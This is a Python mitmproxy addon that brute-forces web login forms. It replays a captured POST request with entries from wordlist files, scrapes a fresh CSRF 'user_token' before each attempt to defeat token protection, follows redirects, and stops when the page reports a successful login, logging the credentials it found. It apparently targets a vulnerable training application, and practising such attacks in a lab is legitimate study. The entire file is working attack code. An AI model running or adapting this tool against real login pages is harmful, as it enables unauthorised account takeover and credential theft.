import logging
from mitmproxy import http
from mitmproxy import net
from mitmproxy import ctx
import os.path
from bs4 import BeautifulSoup


logger = logging.getLogger("formfuzz")

PARAMETER_PREFIX = "fuzz_"
PREFIX_LEN = len(PARAMETER_PREFIX)
DBS_DIR = "./dbs/"

class SuccessDetector:

	def __init__(self):
		self.last_credentials = None
		self.responses = []
		self.success_string = None
		logger.info("STARTED SUCCESS DETECTOR")

	def insertResponse(self, flow: http.HTTPFlow) -> None:
		if flow.response:
			self.responses.append(flow.response.copy())
		else:
			logger.error("Flow has no response, can't insert")

	def setCredentials(self, credentials: dict) -> None:
		self.last_credentials = credentials

	def setSuccessString(self, success_string: str) -> None:
		self.success_string = success_string


	def detector(self, flow: http.HTTPFlow) -> dict:
		result = None
		if not flow.response:
			logger.error("Flow has no response, can't perform detection")
		
		self.insertResponse(flow)

		if self.success_string in flow.response.text:
			logger.info("GREAT SUCCESS! FOUND CORRECT CREDENTIALS: " + str(self.last_credentials))
			result = self.last_credentials
		return result



class Attack:

	def __init__(self):
		self.running = False
		self.fuzzdbs: dict = {}
		self.fuzz_inputs: dict = {}
		self.fuzzed_host = None
		self.fuzzed_url = None
		self.fuzz_flows = {"POST":None, "GET":None}
		self.SD = None
		self.originator_flow = None


	def isRunning(self):
		return self.running

	def start(self, flow: http.HTTPFlow):
		self.running = True
		self.mapDBS(flow.request)
		self.loadFuzzInputs()
		self.fuzzed_url = flow.request.url
		self.fuzzed_host = flow.request.host
		self.originator_flow = flow.copy()
		self.get_tmp = None

		self.SD = SuccessDetector()
		self.SD.setSuccessString("have logged in")

	def stop(self):
		self.running = False
		self.fuzzdbs = {}
		self.fuzz_inputs = {}
		self.fuzzed_host = None
		self.fuzzed_url = None
		self.SD = None

	# Identify and map fuzzed parameters to fuzz files
	def mapDBS(self, parameters: net.http.request) -> None:
		fuzz = False
		parameters = parameters.urlencoded_form
		for parameter in parameters:
			value = parameters[parameter]
			if value.startswith(PARAMETER_PREFIX):
				self.fuzzdbs[parameter] = DBS_DIR + value[PREFIX_LEN:]
				if not os.path.exists(self.fuzzdbs[parameter]):
					logger.error("Fuzz database " + self.fuzzdbs[parameter] + " does not exist")
				else:
					logger.info("Loaded fuzz db path for parameter " + str(parameter) + " => " + self.fuzzdbs[parameter])

	def loadFuzzInputs(self) -> None:
		for parameter in self.fuzzdbs:
			inputs = self.loadFuzzParameters(parameter)
			self.fuzz_inputs[parameter] = inputs
			logger.info("Loaded fuzz inputs for parameter: " + parameter)

	# Load fuzz parameters from file into a dict
	def loadFuzzParameters(self, parameter: str) -> list:
		fuzz_params = []
		param_path = self.fuzzdbs[parameter]
		if not os.path.exists(param_path):
			logger.warning("Path " + param_path + " for parameter " + parameter + " does not exist")
		with open(param_path, "r") as f:
			fuzz_params = [x.strip() for x in f]
		return fuzz_params

	def extractCSRF(self, flow: http.HTTPFlow) -> str:
		if not flow.response:
			logger.error("Trying to extract token from an empty response")
		parsed_html = BeautifulSoup(flow.response.content, features="html.parser")
		csrf_token = parsed_html.body.find("input", attrs={"name":"user_token"}).get("value")
		return csrf_token

	def prepareOriginatorReplay(self, token) -> http.HTTPFlow:
		prepared_request_flow = self.originator_flow.copy()
		prepared_request_flow.request.urlencoded_form["user_token"] = token
		return prepared_request_flow

	def setNextInput(self, flow: http.HTTPFlow) -> None:
		for param in flow.request.urlencoded_form:
			if param in self.fuzz_inputs:
				if not self.fuzz_inputs[param]:
					logger.warning("Fuzz input list is empty, terminating attack")
					self.stop()
					return

				flow.request.urlencoded_form[param] = self.fuzz_inputs[param].pop()
				self.SD.setCredentials({param:flow.request.urlencoded_form[param]})
				break


	def handleRequest(self, flow: http.HTTPFlow) -> None:
		if flow.request.method == "POST" and flow.request.url == self.fuzzed_url:
			logger.info("Spent CSRF token: " + flow.request.urlencoded_form["user_token"])
		if flow.is_replay == "request":
			#self.originator_flow = flow.copy()
			#logger.info("Updated originator POST request flow")
			return
		if flow.request.method == "GET" and flow.request.url == self.fuzzed_url:
			self.get_tmp = flow.copy()
			logger.info("Updated tmp GET request flow")

	def handleResponse(self, flow: http.HTTPFlow) -> None:
		logger.info("Got response:" + str(flow.response))
		if flow.request.method == "GET" and flow.request.host == self.fuzzed_host:
			logger.info("Received response to GET from fuzzed host")

			#if flow.request.url == self.fuzzed_url:
			#	self.get_tmp = flow.request.copy()

			credentials = self.SD.detector(flow)
			if credentials:
				self.stop()
				logger.info("Found credentials, attack stopped")
				logger.info("Credentials: " + str(credentials))
				return

			fresh_token = self.extractCSRF(flow)

			prepared_request_flow = self.prepareOriginatorReplay(fresh_token)

			# Not sure if copy() i needed in here
			self.setNextInput(prepared_request_flow)
			self.originator_flow = prepared_request_flow.copy()

			logger.info("Replaying POST request form with parameters: " + str(prepared_request_flow.request.urlencoded_form))
			ctx.master.commands.call("replay.client", [prepared_request_flow])

		if flow.request.method == "POST" and flow.request.url == self.fuzzed_url:
			logger.info("Before handling 302...")
			if flow.response.status_code == 302:
				if not flow.is_replay == "request":
					logger.info("302 is not a response from replayed mitm request")
					return
				elif flow.is_replay == "request":
					logger.info("POST request to this reply was a replay")
					logger.info("GENERATING GET REPLAY")
					get_flow = self.get_tmp.copy()
					logger.info("get_flow request:" + str(get_flow.request))
					redirect_location = flow.response.headers["Location"]
					get_flow.request.path_components = get_flow.request.path_components[:-1] + (redirect_location, )
					ctx.master.commands.call("replay.client", [get_flow])
					#ctx.master.commands.call("replay.server", [flow])
					#logger.info("REPLAYED 302 TO SERVER")
